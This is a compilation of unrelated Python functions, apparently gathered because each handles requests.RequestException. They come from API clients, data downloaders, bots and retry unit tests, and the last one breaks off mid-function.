def download_as_file(self, file_path, overwrite=False, compress=True):
        if os.path.isfile(file_path) and not overwrite:
            return

        cols = self.get_colnames_from_query(self.query)

        # taken from https://github.com/noaodatalab/datalab/blob/master/dl/queryClient.py#L1791
        r = requests.get(
            "https://datalab.noao.edu/query/query",
            {"sql": self.query, "ofmt": "ascii", "async": False},
            headers={
                "Content-Type": "application/octet-stream",
                "X-DL-AuthToken": "anonymous.0.0.anon_access",
            },
            timeout=(120, 3600),
        )
        if not r.ok:
            raise requests.RequestException('DES query failed: "{}"'.format(r.text))

        t = Table.read(r.text, format="ascii.fast_tab", names=cols)
        r.close()

        file_open = gzip.open if compress else open
        makedirs_if_needed(file_path)
        with file_open(file_path, "wb") as f:
            t.write(f, format="fits") 
**************************************
def download_as_file(self, file_path, overwrite=False, compress=True):
        if not compress:
            raise ValueError("Only support compress=True!")
        if os.path.isfile(file_path) and not overwrite:
            return
        r = requests.get(
            "http://www.slac.stanford.edu/~yymao/saga/base-catalogs-non-sdss/{}_decals_{}.fits.gz".format(
                self.host_id, self.data_release
            ),
            headers={"Content-Type": "application/gzip"},
            stream=True,
            timeout=(120, 3600),
        )

        if not r.ok:
            raise requests.RequestException(
                "Decals-prebuilt download failed: '{}'".format(r.text)
            )

        makedirs_if_needed(file_path)
        chunk_size = 16 * 1024 * 1024
        with open(file_path, "wb") as f:
            # here we don't use iter_content because we want to keep gzipped
            while True:
                chunk = r.raw.read(chunk_size)
                if not chunk:
                    break
                f.write(chunk)
        r.close() 
**************************************
def healthy(self):
        tc = TransplantClient(
            self.flask_app.config.get("TRANSPLANT_URL"),
            self.flask_app.config.get("TRANSPLANT_USERNAME"),
            self.flask_app.config.get("TRANSPLANT_PASSWORD"),
        )
        try:
            resp = tc.ping()
        except requests.RequestException as exc:
            return "RequestException: {!s}".format(exc)

        if resp.status_code != 200:
            return "Unexpected Status Code: {}".format(resp.status_code)

        return True 
**************************************
def request(self, method, url_path, **kwargs):
        """Return the response of a request to Tree Status API.

        Args:
            method: HTTP method to use for request.
            url_path: Path to be appended to api url for request.

        Returns:
            JSON decoded response from TreeStatus

        Raises:
            TreeStatusException:
                Base exception class for other exceptions.
            TreeStatusError:
                If the API returns an error response.
            TreeStatusCommunicationException:
                If there is an error communicating with the API.
        """

        try:
            response = self.session.request(method, self.url + url_path, **kwargs)
            data = response.json()
        except requests.RequestException as exc:
            raise TreeStatusCommunicationException(
                "An error occurred when communicating with Tree Status"
            ) from exc
        except JSONDecodeError as exc:
            raise TreeStatusCommunicationException(
                "Tree Status response could not be decoded as JSON"
            ) from exc

        TreeStatusError.raise_if_error(response, data)
        return data 
**************************************
def ping(self):
        """Ping the Tree Status API

        Returns:
            True if ping was successful, False otherwise.
        """
        try:
            self.session.request("HEAD", self.url + "swagger.json")
            return True
        except requests.RequestException:
            return False 
**************************************
def _get_requests(self, url):
        out = self.empty_json
        try:
            r = requests.get(url, headers=self.headers,
                             auth=(self.username, self.password),
                             timeout=self.timeout, stream=True)
            s = ""
            for chunk in r.iter_content(1024):
                if chunk:
                    s += chunk
            out = json.loads(s)
        except requests.Timeout as e:
            print "Timeout for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "Timeout for url %s: %s" % (url,e,), out
        except requests.ConnectionError as e:
            print "ConnectionError for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "ConnectionError for url %s: %s" % (url,e,), out
        except requests.HTTPError as e:
            print "HTTPError for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "HTTPError for url %s: %s" % (url,e,), out
        except requests.RequestException as e:
            print "RequestException for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "RequestException for url %s: %s" % (url,e,), out
        
        return r.status_code, "OK", out 
**************************************
def _post_requests(self, url, data=""):
        out = self.empty_json
        if isinstance(data, dict):
            data = json.dumps(data)
        elif data:
            try:
                data = json.loads(data)
            except ValueError:
                print "Input not a valid JSON document"
                return 400, "Input not a valid JSON document", out
        try:
            r = requests.post(url, data=data, headers=self.headers,
                             auth=(self.username, self.password),
                             timeout=self.timeout)
        except requests.Timeout as e:
            print "Timeout for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "Timeout for url %s: %s" % (url,e,), out
        except requests.ConnectionError as e:
            print "ConnectionError for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "ConnectionError for url %s: %s" % (url,e,), out
        except requests.HTTPError as e:
            print "HTTPError for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "HTTPError for url %s: %s" % (url,e,), out
        except requests.RequestException as e:
            print "RequestException for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "RequestException for url %s: %s" % (url,e,), out
        return r.status_code, "OK", r.json() 
**************************************
def SaveIconForWebSearch(self, id, url):
		parsedurl = urllib.parse.urlparse(url)
		scheme = parsedurl.scheme
		if scheme == '':
			return False, 'Invalid URL ' + url + ', No scheme found, please include a scheme, eg http://'
		hostName = parsedurl.netloc
		if hostName == '':
			return False, 'Invalid URL ' + url + ' no host name could be determined'
		faviconurl = scheme + '://' + hostName + '/favicon.ico'
		path = os.path.join(self.docsetFolder, str(id)+'.ico')
		try:
			r = requests.get(faviconurl, stream=True)
			if r.status_code == 200:
				with open(path, 'wb') as f:
					for chunk in r:
						f.write(chunk)
				basewidth = 48
				img = Image.open(path)
				wpercent = (basewidth/float(img.size[0]))
				hsize = int((float(img.size[1])*float(wpercent)))
				img = img.resize((basewidth,hsize), Image.ANTIALIAS)
				pathx = path.replace('.ico','')
				pathx = pathx + '@3x.ico'
				basewidth = 32
				img.save(pathx)
				img = Image.open(path)
				wpercent = (basewidth/float(img.size[0]))
				hsize = int((float(img.size[1])*float(wpercent)))
				img = img.resize((basewidth,hsize), Image.ANTIALIAS)
				pathx = path.replace('.ico','')
				pathx = pathx + '@2x.ico'
				img.save(pathx) 
				basewidth = 16
				img = Image.open(path)
				wpercent = (basewidth/float(img.size[0]))
				hsize = int((float(img.size[1])*float(wpercent)))
				img = img.resize((basewidth,hsize), Image.ANTIALIAS)
				img.save(path)
		except requests.RequestException as e:
			pass 
**************************************
def get(url: str, mode='text'):
    try:
        if config['enable_proxy']:
            r = requests.get(url, headers=fake_headers, proxies=proxies)
        else:
            r = requests.get(url, headers=fake_headers)
        if mode == 'img':
            return r
        else:
            return r.text
    except requests.RequestException:
        logger = logging.getLogger('run.get')
        logger.exception('Network Error') 
**************************************
def __handle_response(self, response, raw=False):
        """
        Check a response for issues and parse the return.

        :param requests.Response response: the response
        :param boolean raw: whether the raw body should be returned
        :rtype: str
        :return: if raw, return the response content; if not raw, the data field
        :raises: CommunicationError, ApiError, Error
        """
        # Check for HTTP errors, and re-raise in case
        try:
            response.raise_for_status()
        except requests.RequestException as e:
            _, err = self.__parse_response(response)
            if isinstance(err, ApiError):
                err_msg = "{}: {}".format(e, err.error_msg)
            else:
                err_msg = "{}".format(e)
            raise CommunicationError(err_msg)

        # Otherwise return the data (either parsed or not) but reraise if we have an API error
        if raw:
            return response.content
        data, err = self.__parse_response(response)
        if err:
            raise err
        return data 
**************************************
def before_send(event, hint):
    if 'exc_info' in hint:
        exc_type, exc_value, tb = hint['exc_info']
        if isinstance(exc_value, (RequestException, TimeoutError)):
            return None

    return event 
**************************************
def wtc(self, mask, target, args):
        """Grab a random commit message.

            %%wtc
        """

        try:
            with closing(requests.get('https://whatthecommit.com/index.txt', **REQUEST_OPTIONS)) as response:
                yield f'git commit -m "{response.text.strip()}"'
        except RequestException as ex:
            yield ex.strerror 
**************************************
def refresh(self):
        try:
            self.log_manager.update_execution()
            event_response = self.log_manager.fetch_events(limit=100)
        except (RequestException, APIError) as err:
            self.status_text = 'Failed fetch: %s' % err
        else:
            self.status_text = None
            self.n_events = event_response['total']
            self.events.extend(event_response['events'])
            self.events = self.events[-500:]  # Only keep the last 500 events
        self.draw() 
**************************************
def make_request(self, endpoint, method, payload=None, params=None, content_type="application/json"):
        try:
            request_method = getattr(self.session, method.lower())

            headers = {
                "Content-Type": content_type,
                "Accept": "application/json"
            }

            if not params:
                params = {}
            response = request_method(url=endpoint, headers=headers, params=params, json=payload, verify=False)
        except requests.RequestException as e:
            self.logger.error(e)
            raise

        if response.status_code in range(200, 299):
            try:
                resource = None if response.status_code == 204 else response.json()
            except json.decoder.JSONDecodeError:
                raise PluginException(
                    preset=PluginException.Preset.INVALID_JSON,
                    data=response.text)

            return {'resource': resource, 'status': response.status_code}
        else:
            try:
                error = response.json()
            except json.decoder.JSONDecodeError:
                raise PluginException(
                    preset=PluginException.Preset.INVALID_JSON,
                    data=response.text)

            raise PluginException(cause=f'Error in API request to ServiceNow. ',
                                  assistance=f'Status code: {response.status_code}, Error: {error}') 
**************************************
def fetch_files(self):
        first_file = True
        files_dir = path.join(self.sync_dir, ".studip", "files")
        os.makedirs(files_dir, exist_ok=True)

        sync_files = self.db.list_files(full=True, select_sync_metadata_only=False,
                select_sync_no=False)
        sync_file_paths = ((f, path.join(files_dir, f.id)
                + ("."  + str(f.version) if f.version > 0 else "")) for f in sync_files)
        sync_file_updates = ((f, p, path.isfile(p), not f.local_date
                or f.local_date != f.remote_date) for (f, p) in sync_file_paths)
        pending_files = [(f, p, exists, update) for (f, p, exists, update) in sync_file_updates
                if not exists or update]

        for i, (file, file_path, exists, update) in enumerate(pending_files):
            if first_file:
                print()
                first_file = False
            print("Fetching file {}/{}: {}...".format(i+1, len(pending_files),
                    ellipsize(file.description, 50)))

            url = self.studip_url("/studip/sendfile.php?force_download=1&type=0&" \
                    + urlencode({"file_id": file.id, "file_name": file.name }))
            try:
                r = self.http.get(url)
            except RequestException as e:
                raise SessionError("Unable to download file {}: {}".format(file.name, e))

            with open(file_path, "wb") as writer:
                writer.write(r.content)

            file.local_date = file.remote_date

            timestamp = time.mktime(file.local_date.timetuple())
            os.utime(file_path, (timestamp, timestamp))

            self.db.update_file_local_date(file)
            self.db.commit() 
**************************************
def exists(self, is_external: bool = False, retries: int = 0) -> bool:
        """ Return "found" (or "not found") status of the page as bool. """

        if self.status == Status.FOUND:
            return True

        if self.status == Status.NOT_FOUND:
            return False

        if self.status == Status.IGNORED:
            error = "This URL <{}> ignored"
            raise DeadlinksIgnoredURL(error.format(self.url()))

        try:
            response = request(self.url(), is_external, retries)
        except RequestException as exception:
            self.message = str(exception)
            return False

        # Group of 2XX responses. In general we think its OK to mark URL as
        # reachable and exists
        if response.status_code // 100 == 2:
            self._text = response.text
            return True

        # redirections catching.
        if response.status_code // 100 == 3:
            raise DeadlinksRedirectionURL(response.headers['location'])

        self.message = str(response.status_code)
        return False 
**************************************
def test_iter_users_retry(self, session):
        session.get.side_effect = RequestException
        client = IntercomClient(app_id='app_id', api_key='api_key')
        result = client.iter_users()

        self.assertRaises(RequestException, list, result)
        self.assertEqual(session.get.call_count, RETRY_COUNT) 
**************************************
def test_update_users_retry(self, session):
        session.post.side_effect = RequestException
        client = self._get_client()

        self.assertRaises(RequestException, client.update_users, [])
        self.assertEqual(session.post.call_count, RETRY_COUNT) 
**************************************
def test_create_notes_retry(self, session):
        data = [
            dict(user_id=1, body='body1'),
            dict(user_id=2, body='body2'),
        ]
        session.post.side_effect = RequestException
        client = self._get_client()

        self.assertRaises(RequestException, client.create_notes, data)
        self.assertEqual(session.post.call_count, RETRY_COUNT * len(data)) 
**************************************
def test_subscribe_retry(self, session):
        session.post.side_effect = RequestException
        client = self._get_client()

        self.assertRaises(RequestException, client.subscribe, '', '')
        self.assertEqual(session.post.call_count, RETRY_COUNT) 
**************************************
def sync_dns_from_my_ip(self, dns_type='A'):
        """
        Sync dns from my public ip address.
        It will not do update if ip address in dns record is already same as
        current public ip address.
        :param dns_type:
        :return:
        """
        ip_address = ''
        for finder in self.public_ip_finder:
            try:
                result = requests.get(finder)
            except requests.RequestException:
                continue
            if result.status_code == 200:
                try:
                    socket.inet_aton(result.text)
                    ip_address = result.text
                    break
                except socket.error:
                    try:
                        socket.inet_aton(result.json().get('ip'))
                        ip_address = result.json()['ip']
                        break
                    except socket.error:
                        continue

        if ip_address == '':
            print('None of public ip finder is working. Please try later')
            sys.exit(1)

        try:
            record = self.get_record(dns_type, self.domain) \
                if len(self.domain.split('.')) == 3 \
                else self.get_record(dns_type, self.domain)
        except RecordNotFound:
            self.create_record(dns_type, self.domain, ip_address, proxied=self.proxied)
            print('Successfully created new record with IP address {new_ip}'
                  .format(new_ip=ip_address))
        else:
            if record['content'] != ip_address:
                self.update_record(dns_type, self.domain, ip_address, proxied=record['proxied'])
                print('Successfully updated IP address from {old_ip} to {new_ip}'
                      .format(old_ip=record['content'], new_ip=ip_address))
            else:
                print('IP address on CloudFlare is same as your current address') 
**************************************
def _get_data(self):
        self.data = None
        conf = get_config()
        try:
            res = requests.get('https://www.wienerlinien.at/ogd_realtime/monitor?rbl=%s&sender=%s'
                               % (','.join(map(str, conf['api']['wrlinien']['rbls'])), conf['api']['wrlinien']['key']))
        except RequestException or HTTPError:  # retry on error
            logger.error("Caught RequestException")
            res = requests.get('https://www.wienerlinien.at/ogd_realtime/monitor?rbl=%s&sender=%s'
                               % (','.join(map(str, conf['api']['wrlinien']['rbls'])), conf['api']['wrlinien']['key']))
        res.raise_for_status()
        api_data = res.json()

        if api_data['message']['value'] != 'OK':  # check if server sends OK
            logger.error('[WRL]: NOK. %s' % api_data)
            error_msg = "API returns NOK. Please check the message and the API Key."
            raise WrLinienApiException(error_msg)

        # parse to wrlinien dict
        translated_result = []
        for a_s in api_data['data']['monitors']:
            station = {
                'lines': [],
                'name': a_s['locationStop']['properties']['title'],
            }
            for a_s_l in a_s['lines']:
                line = {
                    'name': a_s_l['name'].rjust(3),
                    'direction': a_s_l['towards'],
                    'barrierFree': a_s_l['barrierFree'],
                    'trafficJam': a_s_l['trafficjam'],
                    'departures': []
                }
                for d in a_s_l['departures']['departure']:
                    if d['departureTime']:
                        line['departures'].append(d['departureTime']['countdown'])
                station['lines'].append(line)
            translated_result.append(station)

        wrlinien_data = {
            'stations': self._merge_stations_by_name(translated_result),
            'lastUpdate': time.strptime(api_data['message']['serverTime'], '%Y-%m-%dT%H:%M:%S.%f%z')
        }
        logger.info("retrieved data: %s" % wrlinien_data)
        self.data = wrlinien_data 
**************************************
def _get_data(self):
        conf = get_config()
        try:
            res = requests.post('https://www.yr.no/place/%s/%s/%s/forecast.xml'
                                % (conf['api']['yrno']['country'], conf['api']['yrno']['province'], conf['api']['yrno']['city']))
        except RequestException or HTTPError:  # retry on error
            logger.error("Caught RequestException")
            res = requests.post('https://www.yr.no/place/%s/%s/%s/forecast.xml'
                                % (conf['api']['yrno']['country'], conf['api']['yrno']['province'], conf['api']['yrno']['city']))
        res.raise_for_status()
        root = ET.fromstring(res.text)

        # filter data and parse to weather dict
        legal_xml = root.find('credit').find('link')
        location_xml = root.find('location')
        sun_xml = root.find('sun')
        weather_data = {
            'credit': {
                "text": legal_xml.get('text'),
                "url": legal_xml.get('url')
            },
            'city': location_xml.find('name').text,
            'country': location_xml.find('country').text,
            'lastUpdate': time.strptime(root.find('meta').find('lastupdate').text, time_format_str),
            'sun': {
                "rise": time.strptime(sun_xml.get('rise'), time_format_str),
                "set": time.strptime(sun_xml.get('set'), time_format_str)
            },
            "forecast": []
        }
        tabular_xml = root.find('forecast').find('tabular')
        for time_xml in tabular_xml.findall('time'):
            symbol_xml = time_xml.find('symbol')
            wind_xml = time_xml.find('windSpeed')
            weather_data['forecast'].append({
                'time': {
                    "from": time.strptime(time_xml.get('from'), time_format_str),
                    "to": time.strptime(time_xml.get('to'), time_format_str)
                },
                'symbol': {
                    "id": symbol_xml.get('number'),
                    "description": symbol_xml.get('name')
                },
                'precipitation': time_xml.find('precipitation').get('value'),
                'wind': {
                    "direction": time_xml.find('windDirection').get('code'),
                    "mps": wind_xml.get('mps'),
                    "description": wind_xml.get('name')
                },
                "celsius": time_xml.find('temperature').get('value')
            })

        logger.info("retrieved data: %s" % weather_data)
        self.data = weather_data 
**************************************
def restore_organization_to_ckan(catalog, owner_org, portal_url, apikey,
                                 dataset_list=None, download_strategy=None,
                                 generate_new_access_url=None,
                                 origin_tz=DEFAULT_TIMEZONE,
                                 dst_tz=DEFAULT_TIMEZONE,
                                 time_delay=0.1):
    """Restaura los datasets de la organización de un catálogo al portal pasado
       por parámetro. Si hay temas presentes en el DataJson que no están en el
       portal de CKAN, los genera.

        Args:
            catalog (DataJson): El catálogo de origen que se restaura.
            portal_url (str): La URL del portal CKAN de destino.
            apikey (str): La apikey de un usuario con los permisos que le
                permitan crear o actualizar el dataset.
            dataset_list(list(str)): Los ids de los datasets a restaurar. Si no
                se pasa una lista, todos los datasests se restauran.
            owner_org (str): La organización a la cual pertencen los datasets.
            download_strategy(callable): Una función (catálogo, distribución)->
                bool. Sobre las distribuciones que evalúa True, descarga el
                recurso en el downloadURL y lo sube al portal de destino.
                Por default no sube ninguna distribución.
            generate_new_access_url(list): Se pasan los ids de las
                    distribuciones cuyo accessURL se regenerar en el portal de
                    destino. Para el resto, el portal debe mantiene el valor
                    pasado en el DataJson.
            origin_tz(str): Timezone de origen, un string (EJ: Africa/Bamako)
                el cual identifica el timezone del emisor del DataJson.
            dst_tz(str): Timezone de destino, un string
                (EJ: Antarctica/Palmer) el cual identifica el timezone del
                receptor del DataJson, comunmente el timezone del servidor.
            time_delay(int): Segundos que espera entre cada request para no
                saturar al CKAN de destino.
        Returns:
            list(str): La lista de ids de datasets subidos.
    """
    push_new_themes(catalog, portal_url, apikey)
    restored = []
    if dataset_list is None:
        try:
            dataset_list = [ds['identifier'] for ds in catalog.datasets]
        except KeyError:
            logger.exception('Hay datasets sin identificadores')
            return restored

    for dataset_id in dataset_list:
        try:
            restored_id = restore_dataset_to_ckan(catalog, owner_org,
                                                  dataset_id, portal_url,
                                                  apikey, download_strategy,
                                                  generate_new_access_url,
                                                  origin_tz=origin_tz,
                                                  dst_tz=dst_tz)
            restored.append(restored_id)
            time.sleep(time_delay)
        except (CKANAPIError, KeyError, AttributeError, RequestException,
                NumericDistributionIdentifierError) as e:
            logger.exception('Ocurrió un error restaurando el dataset {}: {}'
                             .format(dataset_id, str(e)))
    return restored 
**************************************
def add_repo_file(self, org, repo, committer, message, path, contents):
        """Adds the ``contents`` provided to the ``path`` in the repo
        specified and committed by the ``commiter`` parameters
        provided.

        https://developer.github.com/v3/repos/contents/#create-a-file

        .. NOTE::
            This commits directly to the default branch of the repo.

        Args:
            org (str): Organization the repo lives in.
            repo (str): The name of the repo.
            committer (dict): {'name': ..., 'email': ...} for the name
                and e-mail to use in the initial commit of the
                destination repo.
            message (str): Commit message to use for the addition.
            path (str): The content path, i.e. ``docs/.gitignore``
            contents (str): The actual string Contents of the file.
        Raises:
            requests.exceptions.RequestException
            GitHubRepoDoesNotExist
            GitHubUnknownError
        Returns:
            None
        """
        repo_dict = self._get_repo(org, repo)
        if repo_dict is None:
            raise GitHubRepoDoesNotExist(
                'Repo does not exist. Cannot add file'
            )
        url = '{url}repos/{org}/{repo}/contents/{path}'.format(
            url=self.api_url,
            org=org,
            repo=repo,
            path=path
        )
        payload = {
            'message': message,
            'committer': committer,
            'content': base64.b64encode(contents).decode('ascii'),
        }
        response = self.session.put(url, json=payload)
        if response.status_code != 201:
            raise GitHubUnknownError(
                'Failed to add contents to {org}/{repo}/{path}. '
                'Got: {response}'.format(
                    org=org, repo=repo, path=path, response=response.text
                )
            ) 
**************************************
def __init__(self,
                 e,
                 http_request_method=None,
                 http_request_url=None,
                 http_request_payload=None):
        # type: (Exception) -> None

        super(BitmovinError, self).__init__()

        self.http_request_method = http_request_method
        self.http_request_url = http_request_url
        self.http_request_payload = http_request_payload
        self._request = None
        self._response = None
        self.cause = e
        self.message = None
        self.http_status_code = None
        self.short_message = None
        self.developer_message = None
        self.error_code = None
        self.details = []
        self.links = []

        if e is not None:
            self.short_message = e.__str__()

        if isinstance(e, RequestException):
            self._response = e.response  # type: Response
            self._request = e.request  # type: Request

            if self._response is not None:
                self.http_status_code = self._response.status_code
                self.short_message = self._response.reason
                try:
                    body = self._response.json()
                    error = self._map_response_to_error(response=body)
                    if isinstance(error, ResponseErrorData):
                        self.error_code = error.code
                        self.short_message = error.message
                        self.developer_message = error.developer_message
                        self.details = error.details
                        self.links = error.links
                except ValueError:
                    pass

        self.message = self._create_error_message() 
**************************************
def _request(self, method, url_or_endpoint, **kwargs):
        if not url_or_endpoint.startswith(('http://', 'https://')):
            api_base_url = kwargs.pop('api_base_url', self.API_BASE_URL)
            url = '{base}{endpoint}'.format(
                base=api_base_url,
                endpoint=url_or_endpoint
            )
        else:
            url = url_or_endpoint

        if isinstance(kwargs.get('data', ''), dict):
            data = optionaldict(kwargs['data'])
            if 'mchid' not in data:
                # Fuck Tencent
                data.setdefault('mch_id', self.mch_id)
            data.setdefault('sub_mch_id', self.sub_mch_id)
            data.setdefault('nonce_str', random_string(32))
            sign = calculate_signature(data, self.api_key)
            body = dict_to_xml(data, sign)
            body = body.encode('utf-8')
            kwargs['data'] = body

        # 商户证书
        if self.mch_cert and self.mch_key:
            kwargs['cert'] = (self.mch_cert, self.mch_key)

        res = requests.request(
            method=method,
            url=url,
            **kwargs
        )
        try:
            res.raise_for_status()
        except requests.RequestException as reqe:
            raise WeChatPayException(
                return_code=None,
                client=self,
                request=reqe.request,
                response=reqe.response
            )

        return self._handle_result(res) 
**************************************
def _request(self, method, url_or_endpoint, **kwargs):
        if not url_or_endpoint.startswith(('http://', 'https://')):
            url = '{base}{endpoint}'.format(
                base=self.API_BASE_URL,
                endpoint=url_or_endpoint
            )
        else:
            url = url_or_endpoint

        if isinstance(kwargs.get('data', ''), dict):
            body = json.dumps(kwargs['data'], ensure_ascii=False)
            body = body.encode('utf-8')
            kwargs['data'] = body

        res = requests.request(
            method=method,
            url=url,
            **kwargs
        )
        try:
            res.raise_for_status()
        except requests.RequestException as reqe:
            raise WeChatOAuthException(
                errcode=None,
                errmsg=None,
                client=self,
                request=reqe.request,
                response=reqe.response
            )
        result = json.loads(res.content.decode('utf-8', 'ignore'), strict=False)

        if 'errcode' in result and result['errcode'] != 0:
            errcode = result['errcode']
            errmsg = result['errmsg']
            raise WeChatOAuthException(
                errcode,
                errmsg,
                client=self,
                request=res.request,
                response=res
            )

        return result 
**************************************
def _request(self, method, url_or_endpoint, **kwargs):
        if not url_or_endpoint.startswith(('http://', 'https://')):
            api_base_url = kwargs.pop('api_base_url', self.API_BASE_URL)
            url = '{base}{endpoint}'.format(
                base=api_base_url,
                endpoint=url_or_endpoint
            )
        else:
            url = url_or_endpoint

        # 群发消息上传视频接口地址 HTTPS 证书错误，暂时忽略证书验证
        if url.startswith('https://file.api.weixin.qq.com'):
            kwargs['verify'] = False

        if 'params' not in kwargs:
            kwargs['params'] = {}
        if isinstance(kwargs['params'], dict) and \
                'access_token' not in kwargs['params']:
            kwargs['params']['access_token'] = self.access_token
        if isinstance(kwargs.get('data', ''), dict):
            body = json.dumps(kwargs['data'], ensure_ascii=False)
            body = body.encode('utf-8')
            kwargs['data'] = body

        kwargs['timeout'] = kwargs.get('timeout', self.timeout)
        result_processor = kwargs.pop('result_processor', None)
        res = requests.request(
            method=method,
            url=url,
            **kwargs
        )
        try:
            res.raise_for_status()
        except requests.RequestException as reqe:
            raise WeChatClientException(
                errcode=None,
                errmsg=None,
                client=self,
                request=reqe.request,
                response=reqe.response
            )

        return self._handle_result(
            res, method, url, result_processor, **kwargs
        ) 
**************************************
def travis():
    signature = base64.b64decode(request.headers.get('Signature'))
    try:
        public_key = _get_travis_public_key()
    except requests.Timeout:
        print("Timed out when attempting to retrieve Travis CI public key")
        abort(500)
    except requests.RequestException as e:
        print("Failed to retrieve Travis CI public key")
        abort(500)
    try:
        check_authorized(signature, public_key, request.form["payload"])
    except SignatureError:
        abort(401)
    data = json.loads(request.form["payload"])

    repo = data["repository"]["owner_name"] + "/" + data["repository"]["name"]
    build_number = data["id"]
    sha = data["commit"]
    if data["type"] == "pull_request":
        sha = data["head_commit"]
    tag = None
    if data["type"] == "push" and data["tag"] != None:
        tag = data["tag"]
    print(data)

    key = sha
    if tag is not None:
        key = tag

    upload_lock = "upload-lock:" + sha

    if data["state"] in ("started", ):
        print("travis started", key)
        # Handle pulls differently.
        if data["pull_request"]:
            load_code.delay(repo, "pull/" + str(data["pull_request_number"]) + "/head")
        elif data["tag"]:
            load_code.delay(repo, "refs/tags/" + tag)
        else:
            load_code.delay(repo, "refs/heads/" + data["branch"])
        redis.setex(upload_lock, 20 * 60, "locked")
        set_status(repo, sha, "pending", data["build_url"], "Waiting on Travis to complete.")
    elif data["state"] in ("passed", "failed"):
        print("travis finished")
        key = repo + "/" + key
        set_status(repo, sha, "pending", "https://rosie-ci.ngrok.io/log/" + key, "Queueing Rosie test.")
        redis.delete(upload_lock)
        test_commit(repo, sha, tag)
    elif data["state"] is ("cancelled", ):
        print("travis cancelled")
        redis.delete(upload_lock)
        set_status(repo, sha, "error", data["build_url"], "Travis cancelled.")
    elif data["status"] is None:
        set_status(repo, sha, "error", data["build_url"], "Travis error.")
    else:
        print("unhandled state:", data["state"])
        print(data)
    return jsonify({'status': 'received'}) 
**************************************
def call_conduit(self, method, **kwargs):
        """Return the result of an RPC call to a conduit method.

        Args:
            **kwargs: Every method parameter is passed as a keyword argument.

        Returns:
            The 'result' key of the conduit method's response or None if
            the 'result' key doesn't exist.

        Raises:
            PhabricatorAPIException:
                if conduit returns an error response.
            requests.exceptions.RequestException:
                if there is a request exception while communicating
                with the conduit API.
        """
        if "__conduit__" not in kwargs:
            kwargs["__conduit__"] = {"token": self.api_token}

        data = {"output": "json", "params": json.dumps(kwargs)}

        extra_data = {
            "params": kwargs.copy(),
            "method": method,
            "api_url": self.api_url,
        }
        del extra_data["params"]["__conduit__"]  # Sanitize the api token.
        logger.debug("call to conduit", extra=extra_data)

        try:
            response = self.session.get(self.api_url + method, data=data).json()
        except requests.RequestException as exc:
            raise PhabricatorCommunicationException(
                "An error occurred when communicating with Phabricator"
            ) from exc
        except JSONDecodeError as exc:
            raise PhabricatorCommunicationException(
                "Phabricator response could not be decoded as JSON"
            ) from exc

        PhabricatorAPIException.raise_if_error(response)
        return response.get("result") 
**************************************
def __request_requests(self, url, method, data=None):
        out = self.empty_json
        if isinstance(data, dict):
            data = json.dumps(data)
        elif data:
            try:
                data = json.loads(data)
            except ValueError:
                print "Input not a valid JSON document"
                return 400, "Input not a valid JSON document", out
        try:
            if method == 'GET':
                return _get_requests(url, headers=self.headers,
                                     auth=(self.username, self.password),
                                     timeout=self.timeout)
            elif method == 'PUSH':
                return _post_requests(url, data=data, headers=self.headers,
                                      auth=(self.username, self.password),
                                      timeout=self.timeout)
            elif method == 'DELETE':
                r = requests.delete(url, headers=self.headers,
                                    auth=(self.username, self.password),
                                    timeout=self.timeout)
            elif method == 'PUT':
                r = requests.put(url, data=data, headers=self.headers,
                                 auth=(self.username, self.password),
                                 timeout=self.timeout)
            elif method == 'PATCH':
                r = requests.patch(url, data=data, headers=self.headers,
                                   auth=(self.username, self.password),
                                   timeout=self.timeout)
        except requests.Timeout as e:
            print "Timeout for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "Timeout for url %s: %s" % (url,e,), out
        except requests.ProxyError as e:
            print "ProxyError for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "ProxyError for url %s: %s" % (url,e,), out
        except requests.SSLError as e:
            print "SSLError for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "SSLError for url %s: %s" % (url,e,), out
        except requests.ConnectionError as e:
            print "ConnectionError for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "ConnectionError for url %s: %s" % (url,e,), out
        except requests.HTTPError as e:
            print "HTTPError for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "HTTPError for url %s: %s" % (url,e,), out
        except requests.RequestException as e:
            print "RequestException for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "RequestException for url %s: %s" % (url,e,), out
        return r.status_code, "OK", r.json() 
**************************************
def on_url(self, mask, target, data):
        if mask.nick in self.ignore_nicks or data.startswith(self.bot.config.cmd) or data.startswith(f'{self.bot.nick}: '):
            return

        urls = [_clean_url(url) for url in set(URL_FINDER.findall(data))] or []
        for url in urls:
            if urlparse(url).hostname in self.ignore_hostnames:
                urls.remove(url)

        if not urls:
            return

        random.shuffle(urls)
        urls = urls[:3]

        with concurrent.futures.ThreadPoolExecutor(max_workers=len(urls)) as executor:
            messages = []
            self.bot.log.debug(f'Retrieving page titles for {urls}')

            future_to_url = {executor.submit(_parse_url, url): url for url in urls}
            for future in concurrent.futures.as_completed(future_to_url):
                url = future_to_url[future]
                hostname = urlparse(url).hostname

                try:
                    hostname, title, mimetype, size = future.result()
                except InvalidIPAddress:
                    return
                except ContentTypeNotAllowed as ex:
                    self.bot.log.debug(ex)
                except (socket.gaierror, ValueError, requests.RequestException) as ex:
                    formatted_hostname = self.bot.format(hostname, color=self.bot.color.RED)
                    formatted_error = self.bot.format(ex, bold=True)

                    if type(ex) == requests.RequestException:
                        if ex.response is not None and ex.response.reason is not None:
                            formatted_status_code = self.bot.format(ex.response.status_code, bold=True)
                            status_code_name = self.bot.format(ex.response.reason, bold=True)
                            messages.append(f'[ {formatted_hostname} ] {formatted_status_code} {status_code_name}.')
                        return
                    else:
                        messages.append(f'[ {formatted_hostname} ] {formatted_error}.')
                # no exception
                else:
